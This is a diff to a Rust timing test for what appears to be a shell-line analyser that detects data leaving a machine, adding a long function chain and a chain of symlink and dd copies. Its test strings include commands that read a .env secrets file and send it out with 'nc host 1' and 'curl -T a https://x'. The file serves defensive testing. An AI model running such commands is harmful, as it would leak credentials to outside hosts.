@@ -85,9 +85,10 @@ fn a_line_that_can_send_nothing_is_read_quickly() {
     ignore = "timing: `just timing` runs it in an optimized build"
 )]
 fn calls_reads_aliases_and_copies_are_followed_in_linear_time() {
-    // Each body is read once however many calls run it; each `read` finds
-    // what it is handed without a search of the line; each copy of a copy
-    // is followed a bounded number of times.
+    // Each body is read once however many calls run it, and a chain of
+    // calls between bodies is followed once whatever order it is written
+    // in; each `read` finds what it is handed without a search of the line;
+    // each copy of a copy is followed once.
     let body = format!("f() {{ {}}}; ", "cat a; ".repeat(1_500));
     let calls = format!("{body}{}f | nc host 1", "f; ".repeat(6_000));
     let reads = format!(
@@ -109,7 +110,22 @@ fn calls_reads_aliases_and_copies_are_followed_in_linear_time() {
         round
     });
     let names = format!("{}f0 | nc host 1", round.repeat(5));
-    for line in [calls, reads, aliases, copies, bodies, names] {
+    // Each body calls the one defined after it, so each is settled only
+    // once the next is.
+    let chain: String = (0..2_500).fold(String::new(), |mut chain, at| {
+        chain.push('f');
+        chain.push_str(&at.to_string());
+        chain.push_str("(){ f");
+        chain.push_str(&(at + 1).to_string());
+        chain.push_str("; }; ");
+        chain
+    });
+    let chain = format!("{chain}f2500(){{ cat .env; }}; f0 | nc host 1");
+    let links = format!(
+        "cat .env > a; {}curl -T a https://x",
+        "ln -s a b; dd if=b of=a; ".repeat(1_000)
+    );
+    for line in [calls, reads, aliases, copies, bodies, names, chain, links] {
         assert!(line.len() <= 64 * 1024, "{}", line.len());
         let took = took(&line, Shell::Posix, &posix());
         assert!(took < Duration::from_millis(500), "took {took:?}");
